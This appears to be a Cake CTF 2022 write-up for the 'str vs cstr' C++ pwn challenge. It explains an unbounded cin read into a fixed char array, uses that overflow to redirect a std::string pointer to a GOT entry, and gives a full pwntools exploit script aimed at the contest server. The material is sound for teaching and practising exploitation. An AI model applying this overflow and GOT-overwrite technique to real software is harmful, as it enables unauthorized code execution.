---
title: str vs cstr
date: 2022-09-05
readtime: true
tags: [got-overwrite,partial-relro,cpp,string,pwn]
---
### Attachments : [chall](https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/strVsCstr/chall) , [main.cpp](https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/strVsCstr/main.cpp)
<br>

So, this was an interesting challenge on CPP pwn from Cake CTF. This was the first time I tried my hands on cpp pwning. 

First of all, let's have a look on the security features
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```
Partial RELRO and No PIE! Interesting.

Analyzing the source code of this challenge, we can easily spot a buffer overflow. 
```cpp

struct Test{

char* c_str() { return _c_str; }
...
private:
    char _c_str[0x20];
    std::string _str;
}

...
case 1: // set c_str
        std::cout << "c_str: ";
        std::cin >> test.c_str();
        break;
```
So, the program is reading data into `_c_str` without any size check which can be used to cause a buffer overflow. 

Now, let's drop the binary in gdb and add some random data.

<img  src="https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/images/strVsCstr_1.png"/>

<img  src="https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/images/strVsCstr_2.png"/>

Interesting. It is clear that `std::string` is stored in the heap and a pointer to that chunk is stored at `0x7fffffffdd20`, just after the buffer `_c_str`. User data will be read into that chunk whenever `std::cin>>test.str();` is called. We can use the buffer overflow on `_c_str` to replace the pointer to a heap chunk with a GOT address. After that, calling `std::cin>>test.str();` would read user supplied data into that particular GOT address. One suitable GOT entry is `_ZStlsIcSt11char_trait@GLIBCXX_3.4.21` i.e `0x404040`. This will be executed whenever `std::cout << "str: " << test.str() << std::endl;` is called i.e option 4.
Now, let's perform a GOT overwrite to make the pointer at `0x404040` point to `Test::call_me` i.e `0x4016de`.

```py
#!/usr/bin/env python3
from pwn import *
elf = context.binary = ELF("./chall")
# p = elf.process()
# gdb.attach(p)
# 
p = remote("pwn1.2022.cakectf.com",9003)

def set_str(data):
	p.sendlineafter("choice: ","3")
	p.sendlineafter("str: ",data)

def set_cstr(data):
	p.sendlineafter("choice: ","1")
	p.sendlineafter("c_str: ",data)

def get_str():
	p.sendlineafter("choice: ","2")
	return p.recvline()[:-1]

def get_cstr():
	p.sendlineafter("choice: ","4")
	return p.recvline()[:-1]


set_str('0'*20)
set_cstr(b'a'*32+p64(0x404040))
set_str(p64(0x00000000004016de))
p.sendline('4')
p.interactive()
```
<img  src="https://github.com/0xSh4dy/ctf_writeups/raw/master/cake-ctf-2022/images/strVsCstr_3.png"/>

### References
<a href="https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732">https://ptr-yudai.hatenablog.com/entry/2021/11/30/235732</a>
<br>
<a href="https://www.slideshare.net/AngelBoy1/pwning-in-c-basic">https://www.slideshare.net/AngelBoy1/pwning-in-c-basic</a>
